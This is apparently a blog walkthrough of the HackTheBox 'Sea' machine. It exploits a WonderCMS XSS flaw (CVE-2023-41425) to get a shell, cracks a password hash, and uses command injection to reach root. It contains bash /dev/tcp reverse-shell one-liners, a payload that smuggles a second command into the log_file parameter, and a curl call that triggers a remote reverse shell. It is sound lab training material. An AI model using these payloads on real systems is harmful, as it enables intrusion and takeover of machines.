Sea Walkthrough — HackTheBox
============================

![captionless image](https://miro.medium.com/v2/resize:fit:1396/format:webp/1*CcuxoxsOP4AMdxMfbTXH_Q.png)

[Reference](https://medium.com/h7w/sea-walkthrough-hackthebox-47081434aae5) by [MrXcrypt](https://medium.com/@misterxcrypt?source=post_page---byline--47081434aae5--------------------------------)

Introduction
============

In this write-up, We’ll go through an easy Linux machine where we first gain an initial foothold by exploiting a CVE, followed by exploiting a command injection vulnerability to gain root access. #easy #linux #CVE #CommandInjection #writeup #walkthrough #HackTheBox 

> **NOTE:**
> 
> This machine is very unstable and the contact form may not work properly and it may show ‘Failed to send’. Also port forwarding may not work as intended. There is no problem on our side. Please reset the machine and try again. It will work.

Reconnaissance 
==============

1.  After Starting the machine, I set my target IP as $target environment variable and ran the Nmap command. #nmap #recon

**_Command — Port Scan: Nmap_**

```
nmap $target --top-ports=1000 -sV -v -sC  -Pn > nmap.out
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nftXWgAjI9vRw9G6u99Aew.png)

2. As usual, I added the host: sea.htb in /etc/hosts.

3. I started directory fuzzing and subdomain fuzzing in the background while enumerating the website.

4. The site has a contact page which may be vulnerable to XSS. #XSS 

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k9MMzR3omkDGnsdCGws3Vg.png)

**_Command — Directory Fuzzing: Gobuster_** #gobuster 

```
gobuster dir -u http://sea.htb/ -w /mnt/HDD1/VM\ files/kali/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jdck8i7voZmnoHiApLRl4A.png)

5. Again, Let’s run Gobuster to check for directories in the ‘themes’ directory.

**_Command — Directory Fuzzing: Gobuster_**

```
gobuster dir -u http://sea.htb/themes/ -w /mnt/HDD1/VM\ files/kali/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0IC_XwbPrzbpmWWHcpTkog.png)

6. Let’s run Gobuster again to check for directories in the ‘bike’ directory.

**_Command — Directory Fuzzing: Gobuster_**

```
gobuster dir -u http://sea.htb/themes/bike/ -w /mnt/HDD1/VM\ files/kali/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kJ9sfFJGGWzL2W-_ie080g.png)

7. While viewing the LICENSE file in our browser, we can see it is made by a user named ‘turboblack’.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ai_6B3t5rSjM9z1uu2lo8g.png)

8. Upon finding the user in GitHub, we can that it is a WonderCMS site. #WonderCMS 

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*osqWTmqOo0UobUTxF2l1WQ.png)

9. We can also find this information by searching for the sites’ CSS code in Git Hub.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MnbFI8E8KRgGdPQBB8Oktw.png)![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G8u7EK2FqqQZ1YS-I3sR4w.png)![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0IMa3yVbe8sPdDYQbtWX-w.png)

10. Let’s search for “WonderCMS exploit” in Google as it is an easy machine. #Exploit 

**Exploit:** [https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413](https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413)

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MGJQTPYa3dIUNIgd-W3CaQ.png)

Initial Foothold
================

1.  Learn about the exploit in this link

**Article:** [https://www.recordedfuture.com/vulnerability-database/CVE-2023-41425](https://www.recordedfuture.com/vulnerability-database/CVE-2023-41425)

CVE-2023–41425 Description
--------------------------

> CVE-2023–41425 is a Cross-Site Scripting (XSS) vulnerability affecting Wonder CMS versions 3.2.0 to 3.4.2. An attacker can exploit this flaw by uploading a malicious script to the installModule component, enabling them to execute arbitrary code on unsuspecting users’ browsers.

If you’d like a detailed explanation of this CVE and how it works, let me know in the comments! I’ll create another blog dedicated to this CVE, including practical, step-by-step manual exploitation. #CVE-2023-41425 

2. This PoC offers an exploit.py file that exploits XSS to get RCE. #RemoteCodeExecution 

3. The Python file takes three arguments: login URL, Attacker IP, and Attacker port. The example of the login URL is given in the exploit.py help.

4. We found the login page by adding ‘loginURL’ to the homepage URL.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UF7xOOQ6wbQunEmrUzBt3g.png)

> **Behind the scenes of the exploit tool:**
> 
> 1. The tool crafts a payload and a js file.
> 
> 2. The XSS payload should be injected in the contact form.
> 
> 3. Then the payload makes the server download our js file which is made by the tool, and execute it in the server.
> 
> 4. The JS file download a reverse shell script from a github repo and executes it by crafting an URL.

5. We can download the reverse shell GitHub zip file and start a Python server in our attacker machine to make the process easy. #ReverseShell 

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*8lDD8vMgoPUWHlTO3ND1SA.png)

6. Then modify the xss.js JS file to get from our attacker machine instead of GitHub.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*diOVxM2Zj4zNTeuQFuMMPA.png)

7. Also, I found another problem with the JS file.

![captionless image](https://miro.medium.com/v2/resize:fit:1188/format:webp/1*pZck5pEtBd8OshVCVUF_Rw.png)

8. When we run the JS code in our browser console, we see the below.

![captionless image](https://miro.medium.com/v2/resize:fit:924/format:webp/1*4DFRGwVlp-kCKkCtCrq9nA.png)

9. The urlWithoutLogBase variable should be ‘sea.htb’ instead of ‘/’. In the last section of the JS file, the urlWithoutLogBase was used to download the reverse shell zip file.

10. We can get ‘sea.htb’ by using ‘hostname’ instead of pathname.

![captionless image](https://miro.medium.com/v2/resize:fit:1170/format:webp/1*LDwPEN4tUUenZy60W5eyKg.png)

11. Just change the JS file accordingly.

![captionless image](https://miro.medium.com/v2/resize:fit:1230/format:webp/1*SftypHTi0KPEW0anqz8s4w.png)

12. Now running the exploit python file will give us a payload to inject in contact form.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wKvHy0IXtG4qjORjKNy-yw.png)

13. Let’s start a Netcat listener on port 4444 as we mentioned in the above command. #netcat

14. The victim server downloaded our files as intended.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1EPJKeHMiyRfn6mU_dnDXA.png)

15. But we still haven’t got the reverse shell yet. Let’s inspect how the reverse shell file is executed in the JS file #ReverseShell 

```
xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
```

16. Let’s curl this URL with ‘lhost’ and ‘lport’ while having our Netcat listening.

Exploit:
--------

**_Command — curl the link: curl_** #Exploitation 

```
curl "http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.65&lport=4444"
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*X2y818bhgcp_-GeFbhsszw.png)

Reverse Shell Listener:
-----------------------

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-pAJokYkImlUoWKz_uA9oQ.png)

17. Now we have a shell as a www-data user.

**_Command — Spawn Bash shell: python one-liner_**

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

18. The above command will spawn the more stable bash shell.

19. As a www-data user, We don’t have much permission.

Lateral Movement
================

i. User Flag
------------

1.  First, Let’s go into the directory that serves the website ‘/var/www/sea’.
2.  In the database.js file, we found a password hash hardcoded in the JS code.
3.  Let’s crack the password hash using ‘john’

**_Command — Cracking password hash: john_** #JohnTheRipper 

```
john hash --wordlist=/mnt/HDD1/VM\ files/kali/wordlists/rockyou.txt --format=bcrypt
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*m165EkZF5jKBlA3GgMYC_Q.png)

4. Let’s use this password for the user ‘amay’. #userflag 

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J2lJHY90e-D9YFiRgEFv_g.png)

ii. Root Flag
-------------

1.  Now, We have low-privileged user access. Let’s check for processes and other open ports. #rootflag #PrivilegeEscalation 

**_Command — Check running processes: ps_** #ps

```
ps aux
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IU7_VupywYjs7InDfxuR1w.png)

2. We don’t have many processes running. Let’s check for open ports.

**_Command — Check ports: ss_**

```
ss -lntp
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Wy2Vi-OhP8oP2FcOZCS-YA.png)

3. There is a service running on port 8080. We can forward this port to check what’s running.

**_Command — Forward port: ssh_** #ssh

```
ssh -L 9001:127.0.0.1:8080 amay@10.10.11.28
```

4. Upon opening port 8080 on our browser, we see the below.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*f2FNaAarnxxGBxt6oMMenQ.png)

5. Clicking the ‘Analyze’ fetches the file ‘access.log’. On seeing the output, Command injection was the first thing that came to my mind.

6. Firedup Burp and sent the request to ‘Repeater’. Changed the ‘log_file’ parameter to ‘/etc/passwd’.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cyBGbAChn-XoaToBCpsU5w.png)

7. It fetched and showed the file. So it is indeed a command injection vulnerability. #CommandInjection 

8. Attempting to fetch /root/root.txt didn’t reveal the flag. While we could use a bash one-liner reverse shell to gain a root shell, let’s explore why the root.txt file wasn’t retrieved.

**Payload:** /root/root.txt;a

9. Playing around with the parameter ‘log_file’ revealed the root flag for the above payload. I don’t know why it worked. Let’s get a root shell.

**_Command — bash reverse shell: bash_**

```
bash -c 'bash -i >& /dev/tcp/10.10.14.65/4000 0>&1'
```

**_Command — reverse shell listener: nc_**

```
rlwrap nc -nvlp 4000
```

**Payload:** /root/root.txt; bash -c ‘bash -i >& /dev/tcp/10.10.14.65/4000 0>&1’;a

10. URL Encode the payload in burp.

**Payload:** /root/root.txt%3b+bash+-c+’bash+-i+>%26+/dev/tcp/10.10.14.65/4000+0>%261'%3ba

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qpu6thsyPrTwifnWiTLsyQ.png)

Now, We are ROOT! Thanks for Reading. Happy hacking!!